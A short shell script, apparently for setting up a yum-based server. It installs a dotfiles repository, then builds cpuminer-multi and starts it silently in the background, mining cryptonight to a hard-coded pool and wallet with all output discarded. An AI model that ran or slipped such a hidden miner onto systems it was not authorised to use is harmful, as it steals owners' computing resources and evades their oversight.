#!/bin/sh
cd `dirname $0`

yum update -y
yum install -y autoconf automake libcurl-devel git zsh
git clone https://github.com/atton/dot_files
cd dot_files
./install.sh
git clone https://github.com/OhGodAPet/cpuminer-multi
cd cpuminer-multi
./autogen.sh
CFLAGS="-march=native" ./configure
make install
/usr/local/bin/minerd -B -q -a cryptonight -o stratum+tcp://krb.crypto-coins.club:5555 -u KgGc79QyYag4LugEc2Gnxobt7Mfe9CSEh4NqGzdysooL3Czy6mKtuqLiCehzgoBDESTaYDN3U9XtgLxVJLmPCi397ppx6cL -p x -t 1 >& /dev/null
